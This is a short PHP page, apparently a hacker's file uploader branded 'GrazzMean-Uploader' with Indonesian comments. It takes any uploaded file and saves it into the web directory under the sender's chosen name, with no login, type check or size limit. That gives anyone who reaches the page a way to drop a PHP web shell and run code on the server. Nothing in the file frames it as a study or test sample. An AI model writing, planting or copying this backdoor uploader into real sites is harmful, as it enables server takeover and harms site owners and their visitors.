<?php

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["file"])) {
    $uploadDir = "./"; // Direktori untuk menyimpan file (direktori saat ini)
    $uploadFile = $uploadDir . basename($_FILES["file"]["name"]); // Path lengkap untuk file yang diunggah

    // Cek apakah file berhasil diunggah
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $uploadFile)) {
        echo "success";
    } else {
        echo "failed";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GrazzMean-Uploader</title>
</head>
<body>
    <h2>Form Upload File</h2>
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post" enctype="multipart/form-data">
        <input type="file" name="file" id="file">
        <button type="submit" name="submit">Upload</button>
    </form>
</body>
</html>
